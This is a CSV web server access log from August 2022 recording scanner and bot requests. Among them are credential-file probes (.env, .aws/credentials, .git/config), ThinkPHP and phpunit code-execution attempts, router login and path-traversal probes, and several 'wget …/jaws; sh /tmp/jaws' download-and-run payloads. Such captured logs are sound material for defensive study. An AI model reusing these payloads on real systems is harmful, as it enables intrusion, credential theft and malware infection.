remote_host,ident,user,time_raw,time_iso,time_epoch,method,uri,protocol,status,bytes_sent,referer,user_agent
109.237.103.118,,,07/Aug/2022:22:28:28 -0500,2022-08-07T22:28:28-05:00,1659929308,GET,/app/.env,HTTP/1.1,301,240.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.118,,,07/Aug/2022:22:28:28 -0500,2022-08-07T22:28:28-05:00,1659929308,POST,/app/.env,HTTP/1.1,301,240.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.118,,,07/Aug/2022:22:28:28 -0500,2022-08-07T22:28:28-05:00,1659929308,GET,/js/app.js,HTTP/1.1,301,241.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.118,,,07/Aug/2022:22:28:29 -0500,2022-08-07T22:28:29-05:00,1659929309,POST,/js/app.js,HTTP/1.1,301,241.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.7.214.104,,,07/Aug/2022:22:37:51 -0500,2022-08-07T22:37:51-05:00,1659929871,GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,HTTP/1.1,301,282.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2001:470:1:c84::31,,,07/Aug/2022:22:37:58 -0500,2022-08-07T22:37:58-05:00,1659929878,GET,/,HTTP/1.1,400,226.0,,
35.90.2.159,,,07/Aug/2022:22:46:07 -0500,2022-08-07T22:46:07-05:00,1659930367,GET,/,HTTP/1.1,301,241.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.219.212.154,,,07/Aug/2022:22:46:17 -0500,2022-08-07T22:46:17-05:00,1659930377,GET,/favicon.ico,HTTP/1.1,301,252.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.219.212.154,,,07/Aug/2022:22:46:18 -0500,2022-08-07T22:46:18-05:00,1659930378,GET,/,HTTP/1.1,301,241.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
185.7.214.104,,,07/Aug/2022:23:16:15 -0500,2022-08-07T23:16:15-05:00,1659932175,GET,/solr/admin/info/system?wt=json,HTTP/1.1,301,262.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
44.234.111.179,,,07/Aug/2022:23:34:16 -0500,2022-08-07T23:34:16-05:00,1659933256,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
185.254.196.223,,,08/Aug/2022:00:23:14 -0500,2022-08-08T00:23:14-05:00,1659936194,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223,,,08/Aug/2022:00:23:14 -0500,2022-08-08T00:23:14-05:00,1659936194,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.7.214.104,,,08/Aug/2022:00:35:59 -0500,2022-08-08T00:35:59-05:00,1659936959,GET,/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21,HTTP/1.1,301,356.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
101.43.83.130,,,08/Aug/2022:00:39:42 -0500,2022-08-08T00:39:42-05:00,1659937182,GET,http://194.195.210.97:80/db/scripts/setup.php,HTTP/1.0,301,252.0,,
101.43.83.130,,,08/Aug/2022:00:39:45 -0500,2022-08-08T00:39:45-05:00,1659937185,GET,http://194.195.210.97:80/phpMyAdmin/scripts/setup.php,HTTP/1.0,301,260.0,,
101.43.83.130,,,08/Aug/2022:00:39:45 -0500,2022-08-08T00:39:45-05:00,1659937185,GET,http://194.195.210.97:80/pma/scripts/setup.php,HTTP/1.0,301,253.0,,
101.43.83.130,,,08/Aug/2022:00:39:45 -0500,2022-08-08T00:39:45-05:00,1659937185,GET,http://194.195.210.97:80/mysql/scripts/setup.php,HTTP/1.0,301,255.0,,
185.7.214.104,,,08/Aug/2022:01:23:12 -0500,2022-08-08T01:23:12-05:00,1659939792,GET,/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>,HTTP/1.1,301,300.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.103.9,,,08/Aug/2022:01:53:15 -0500,2022-08-08T01:53:15-05:00,1659941595,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9,,,08/Aug/2022:01:53:15 -0500,2022-08-08T01:53:15-05:00,1659941595,\x16\x03\x01\x01D\x01,,,400,226.0,,
109.237.103.9,,,08/Aug/2022:01:53:16 -0500,2022-08-08T01:53:16-05:00,1659941596,POST,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9,,,08/Aug/2022:01:53:16 -0500,2022-08-08T01:53:16-05:00,1659941596,GET,/.aws/credentials,HTTP/1.1,301,248.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9,,,08/Aug/2022:01:53:16 -0500,2022-08-08T01:53:16-05:00,1659941596,POST,/.aws/credentials,HTTP/1.1,301,248.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9,,,08/Aug/2022:01:53:17 -0500,2022-08-08T01:53:17-05:00,1659941597,GET,/.aws/config,HTTP/1.1,301,243.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9,,,08/Aug/2022:01:53:17 -0500,2022-08-08T01:53:17-05:00,1659941597,POST,/.aws/config,HTTP/1.1,301,243.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9,,,08/Aug/2022:01:53:17 -0500,2022-08-08T01:53:17-05:00,1659941597,GET,/aws/credentials,HTTP/1.1,301,247.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9,,,08/Aug/2022:01:53:18 -0500,2022-08-08T01:53:18-05:00,1659941598,POST,/aws/credentials,HTTP/1.1,301,247.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9,,,08/Aug/2022:01:53:18 -0500,2022-08-08T01:53:18-05:00,1659941598,GET,/credentials,HTTP/1.1,301,243.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9,,,08/Aug/2022:01:53:18 -0500,2022-08-08T01:53:18-05:00,1659941598,POST,/credentials,HTTP/1.1,301,243.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.7.214.104,,,08/Aug/2022:02:01:07 -0500,2022-08-08T02:01:07-05:00,1659942067,GET,/?XDEBUG_SESSION_START=phpstorm,HTTP/1.1,301,262.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
71.6.232.4,,,08/Aug/2022:02:06:14 -0500,2022-08-08T02:06:14-05:00,1659942374,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
185.7.214.104,,,08/Aug/2022:02:32:57 -0500,2022-08-08T02:32:57-05:00,1659943977,GET,/console/,HTTP/1.1,301,240.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.61.184.133,,,08/Aug/2022:02:33:02 -0500,2022-08-08T02:33:02-05:00,1659943982,POST,/boaform/admin/formLogin,HTTP/1.1,301,255.0,http://194.195.210.97:80/admin/login.asp,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
192.241.207.167,,,08/Aug/2022:02:37:17 -0500,2022-08-08T02:37:17-05:00,1659944237,GET,/manager/text/list,HTTP/1.1,301,249.0,,Mozilla/5.0 zgrab/0.x
36.85.220.37,,,08/Aug/2022:02:53:07 -0500,2022-08-08T02:53:07-05:00,1659945187,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
104.248.75.7,,,08/Aug/2022:02:53:08 -0500,2022-08-08T02:53:08-05:00,1659945188,GET,/,HTTP/1.1,301,232.0,194.195.210.97,Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
203.122.46.146,,,08/Aug/2022:03:05:56 -0500,2022-08-08T03:05:56-05:00,1659945956,GET,/shell?cd+/tmp;rm+-rf+*;wget+rischyo.cf/jaws;sh+/tmp/jaws,HTTP/1.1,301,288.0,,"Hello, world"
165.227.22.86,,,08/Aug/2022:03:06:46 -0500,2022-08-08T03:06:46-05:00,1659946006,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
165.227.22.86,,,08/Aug/2022:03:06:46 -0500,2022-08-08T03:06:46-05:00,1659946006,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
165.227.22.86,,,08/Aug/2022:03:06:46 -0500,2022-08-08T03:06:46-05:00,1659946006,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
165.227.22.86,,,08/Aug/2022:03:06:46 -0500,2022-08-08T03:06:46-05:00,1659946006,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
165.227.22.86,,,08/Aug/2022:03:06:46 -0500,2022-08-08T03:06:46-05:00,1659946006,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
165.227.22.86,,,08/Aug/2022:03:06:47 -0500,2022-08-08T03:06:47-05:00,1659946007,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
165.227.22.86,,,08/Aug/2022:03:06:49 -0500,2022-08-08T03:06:49-05:00,1659946009,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
185.254.196.223,,,08/Aug/2022:03:23:29 -0500,2022-08-08T03:23:29-05:00,1659947009,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223,,,08/Aug/2022:03:23:30 -0500,2022-08-08T03:23:30-05:00,1659947010,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.7.214.104,,,08/Aug/2022:03:44:01 -0500,2022-08-08T03:44:01-05:00,1659948241,POST,/Autodiscover/Autodiscover.xml,HTTP/1.1,301,261.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.7.214.104,,,08/Aug/2022:04:12:59 -0500,2022-08-08T04:12:59-05:00,1659949979,GET,/_ignition/execute-solution,HTTP/1.1,301,258.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.203.186,,,08/Aug/2022:04:44:52 -0500,2022-08-08T04:44:52-05:00,1659951892,GET,/hudson,HTTP/1.1,301,238.0,,Mozilla/5.0 zgrab/0.x
185.7.214.104,,,08/Aug/2022:04:53:29 -0500,2022-08-08T04:53:29-05:00,1659952409,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.21.216.169,,,08/Aug/2022:04:56:55 -0500,2022-08-08T04:56:55-05:00,1659952615,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
185.7.214.104,,,08/Aug/2022:05:35:44 -0500,2022-08-08T05:35:44-05:00,1659954944,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh,HTTP/1.1,400,226.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.94.92.32,,,08/Aug/2022:05:51:29 -0500,2022-08-08T05:51:29-05:00,1659955889,GET,/.git/config,HTTP/1.1,301,243.0,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0
183.136.225.35,,,08/Aug/2022:05:53:15 -0500,2022-08-08T05:53:15-05:00,1659955995,GET,/,HTTP/1.1,301,232.0,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0
194.153.112.120,,,08/Aug/2022:06:03:21 -0500,2022-08-08T06:03:21-05:00,1659956601,GET,http://194.195.210.97:80/pma/scripts/setup.php,HTTP/1.0,301,253.0,,
194.153.112.120,,,08/Aug/2022:06:03:21 -0500,2022-08-08T06:03:21-05:00,1659956601,GET,http://194.195.210.97:80/mysql/scripts/setup.php,HTTP/1.0,301,255.0,,
194.153.112.120,,,08/Aug/2022:06:03:21 -0500,2022-08-08T06:03:21-05:00,1659956601,GET,http://194.195.210.97:80/db/scripts/setup.php,HTTP/1.0,301,252.0,,
194.153.112.120,,,08/Aug/2022:06:03:21 -0500,2022-08-08T06:03:21-05:00,1659956601,GET,http://194.195.210.97:80/phpMyAdmin/scripts/setup.php,HTTP/1.0,301,260.0,,
185.254.196.223,,,08/Aug/2022:06:24:22 -0500,2022-08-08T06:24:22-05:00,1659957862,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223,,,08/Aug/2022:06:24:24 -0500,2022-08-08T06:24:24-05:00,1659957864,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.7.214.104,,,08/Aug/2022:06:41:53 -0500,2022-08-08T06:41:53-05:00,1659958913,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.206.156,,,08/Aug/2022:06:46:09 -0500,2022-08-08T06:46:09-05:00,1659959169,GET,/actuator/health,HTTP/1.1,301,247.0,,Mozilla/5.0 zgrab/0.x
2a01:7e01::f03c:93ff:fe25:2b50,,,08/Aug/2022:07:00:16 -0500,2022-08-08T07:00:16-05:00,1659960016,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
27.206.90.222,,,08/Aug/2022:07:07:02 -0500,2022-08-08T07:07:02-05:00,1659960422,GET,/boaform/admin/formLogin?username=ec8&psd=ec8,HTTP/1.0,301,281.0,,
217.83.81.126,,,08/Aug/2022:07:07:58 -0500,2022-08-08T07:07:58-05:00,1659960478,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.7.214.104,,,08/Aug/2022:07:20:13 -0500,2022-08-08T07:20:13-05:00,1659961213,GET,/actuator/gateway/routes,HTTP/1.1,301,255.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.104.138.223,,,08/Aug/2022:08:15:00 -0500,2022-08-08T08:15:00-05:00,1659964500,GET,/fuN3,HTTP/1.0,301,237.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"
95.222.83.181,,,08/Aug/2022:08:35:08 -0500,2022-08-08T08:35:08-05:00,1659965708,GET,/,HTTP/1.0,301,233.0,,masscan/1.0 (https://github.com/robertdavidgraham/masscan)
185.254.196.223,,,08/Aug/2022:09:23:41 -0500,2022-08-08T09:23:41-05:00,1659968621,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223,,,08/Aug/2022:09:23:42 -0500,2022-08-08T09:23:42-05:00,1659968622,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
181.224.243.165,,,08/Aug/2022:09:52:48 -0500,2022-08-08T09:52:48-05:00,1659970368,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
142.113.113.226,,,08/Aug/2022:10:00:44 -0500,2022-08-08T10:00:44-05:00,1659970844,GET,/,HTTP/1.1,301,232.0,,
128.14.133.58,,,08/Aug/2022:10:08:36 -0500,2022-08-08T10:08:36-05:00,1659971316,GET,/solr/,HTTP/1.1,301,237.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
95.137.137.171,,,08/Aug/2022:10:34:56 -0500,2022-08-08T10:34:56-05:00,1659972896,GET,/shell?cd+/tmp;rm+-rf+*;wget+,qwugdsabbdsdeeeeb212c.bydthkk.top/jaws;sh+/tmp/jaws,400,226.0,,
20.29.103.238,,,08/Aug/2022:10:38:04 -0500,2022-08-08T10:38:04-05:00,1659973084,GET,/shell?cd+/tmp;rm+-rf+*;wget+0.0.0.0/jaws;sh+/tmp/jaws,HTTP/1.1,301,285.0,,"Hello, world"
45.227.254.52,,,08/Aug/2022:11:07:33 -0500,2022-08-08T11:07:33-05:00,1659974853,\x03,,,400,226.0,,
45.227.254.52,,,08/Aug/2022:11:07:34 -0500,2022-08-08T11:07:34-05:00,1659974854,\x03,,,400,226.0,,
35.231.6.204,,,08/Aug/2022:11:18:06 -0500,2022-08-08T11:18:06-05:00,1659975486,GET,/,HTTP/1.1,301,232.0,,
35.231.6.204,,,08/Aug/2022:11:18:06 -0500,2022-08-08T11:18:06-05:00,1659975486,POST,/HNAP1/,HTTP/1.1,301,238.0,,Mozila/5.0
20.0.79.186,,,08/Aug/2022:11:20:28 -0500,2022-08-08T11:20:28-05:00,1659975628,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.0.79.186,,,08/Aug/2022:11:20:29 -0500,2022-08-08T11:20:29-05:00,1659975629,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
184.105.247.196,,,08/Aug/2022:11:48:02 -0500,2022-08-08T11:48:02-05:00,1659977282,GET,/,HTTP/1.1,301,232.0,,
184.105.247.196,,,08/Aug/2022:11:50:44 -0500,2022-08-08T11:50:44-05:00,1659977444,GET,/,HTTP/1.1,301,232.0,,Mozilla/5.0 zgrab/0.x
184.105.247.200,,,08/Aug/2022:11:52:52 -0500,2022-08-08T11:52:52-05:00,1659977572,GET,/favicon.ico,HTTP/1.1,301,243.0,,Mozilla/5.0 zgrab/0.x
185.254.196.223,,,08/Aug/2022:12:24:44 -0500,2022-08-08T12:24:44-05:00,1659979484,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223,,,08/Aug/2022:12:24:45 -0500,2022-08-08T12:24:45-05:00,1659979485,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
85.72.39.196,,,08/Aug/2022:12:36:16 -0500,2022-08-08T12:36:16-05:00,1659980176,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
185.21.216.169,,,08/Aug/2022:13:05:55 -0500,2022-08-08T13:05:55-05:00,1659981955,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
185.196.220.70,,,08/Aug/2022:14:17:25 -0500,2022-08-08T14:17:25-05:00,1659986245,GET,/,HTTP/1.1,301,232.0,,Linux Gnu (cow)
185.254.196.223,,,08/Aug/2022:15:24:05 -0500,2022-08-08T15:24:05-05:00,1659990245,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223,,,08/Aug/2022:15:24:05 -0500,2022-08-08T15:24:05-05:00,1659990245,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
221.0.190.249,,,08/Aug/2022:15:29:40 -0500,2022-08-08T15:29:40-05:00,1659990580,POST,/GponForm/diag_Form?images/,HTTP/1.1,301,258.0,,"Hello, World"
35.233.62.116,,,08/Aug/2022:15:41:57 -0500,2022-08-08T15:41:57-05:00,1659991317,GET,/,HTTP/1.1,301,232.0,,python-requests/2.28.1
103.90.235.91,,,08/Aug/2022:15:43:55 -0500,2022-08-08T15:43:55-05:00,1659991435,GET,/wp-login.php,HTTP/1.1,301,253.0,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96
144.202.36.16,,,08/Aug/2022:15:51:51 -0500,2022-08-08T15:51:51-05:00,1659991911,GET,/,HTTP/1.1,301,241.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
192.241.220.36,,,08/Aug/2022:15:59:11 -0500,2022-08-08T15:59:11-05:00,1659992351,MGLNDD_194.195.210.97_80\n,,,400,226.0,,
31.7.58.162,,,08/Aug/2022:17:27:55 -0500,2022-08-08T17:27:55-05:00,1659997675,POST,/boaform/admin/formLogin,HTTP/1.1,301,255.0,http://194.195.210.97:80/admin/login.asp,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
5.188.210.227,,,08/Aug/2022:17:35:04 -0500,2022-08-08T17:35:04-05:00,1659998104,GET,http://5.188.210.227/echo.php,HTTP/1.1,301,240.0,https://www.google.com/,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
31.7.58.162,,,08/Aug/2022:17:56:53 -0500,2022-08-08T17:56:53-05:00,1659999413,POST,/boaform/admin/formLogin,HTTP/1.1,301,255.0,http://194.195.210.97:80/admin/login.asp,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
185.254.196.223,,,08/Aug/2022:18:23:48 -0500,2022-08-08T18:23:48-05:00,1660001028,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223,,,08/Aug/2022:18:23:49 -0500,2022-08-08T18:23:49-05:00,1660001029,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2.57.122.225,,,08/Aug/2022:18:51:24 -0500,2022-08-08T18:51:24-05:00,1660002684,GET,http://example.com/,HTTP/1.1,301,232.0,,Go-http-client/1.1
2.57.122.225,,,08/Aug/2022:18:51:24 -0500,2022-08-08T18:51:24-05:00,1660002684,CONNECT,hilltopmanor.xyz:443,HTTP/1.1,301,233.0,,Go-http-client/1.1
5.188.62.26,,,08/Aug/2022:19:14:36 -0500,2022-08-08T19:14:36-05:00,1660004076,GET,/skillscybersecurityok.com.sql,HTTP/1.1,301,270.0,,"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36"
45.143.200.118,,,08/Aug/2022:19:36:39 -0500,2022-08-08T19:36:39-05:00,1660005399,\x03,,,400,226.0,,
